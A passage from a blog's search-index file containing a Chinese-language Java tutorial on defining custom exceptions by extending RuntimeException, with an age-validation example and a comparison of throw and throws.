或RuntimeException </li><li>如果继承Exception ，属于编译异常</li><li>如果继承RuntimeException ，属于运行异常（一般都是继承RuntimeExceptipn）</li></ol><p>即我们把自定义异常作为运行时异常（好处可以使用默认的处理机制）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exception;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomExcepption</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123; <span class="hljs-comment">/*throws AgeException*/</span><br>        <span class="hljs-type">int</span> age=<span class="hljs-number">818</span>;<br>        <span class="hljs-keyword">if</span> (!(age&gt;=<span class="hljs-number">18</span> &amp;&amp; age&lt;=<span class="hljs-number">120</span>))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SelfException</span>(<span class="hljs-string">&quot;年龄需要在18~120之间&quot;</span>);<span class="hljs-comment">//new 自定义异常类，才能调用构造方法</span><br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;你的年龄范围正确&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//自定义类名 继承 运行异常 就变成  自定义异常   一般情况下自定义异常是继承编译异常 （好处：我们可以使用默认的处理机制）</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SelfException</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">RuntimeException</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SelfException</span><span class="hljs-params">(String message)</span> &#123;<br>        <span class="hljs-built_in">super</span>(message);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/03/20/java-%E5%9F%BA%E7%A1%80/image-20250326192411669-17429941347282.png" alt="image-20250326192411669"></p><hr><p><strong>throw vs throws:</strong></p><ul><li><p>throws :代表异常处理方式    位于方法声明中   后面跟异常类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">throws</span> AgeException<br></code></pre></td></tr></table></figure></li><li><p>throw: 是手动生创建异常对象的关键字    位于方法体中   后面跟异常对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SelfException</span>(<span class="hljs-string">&quot;年龄需要在18~120之间&quot;</span>);<br></code></pre></td></tr></table></figure></li></ul><hr>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
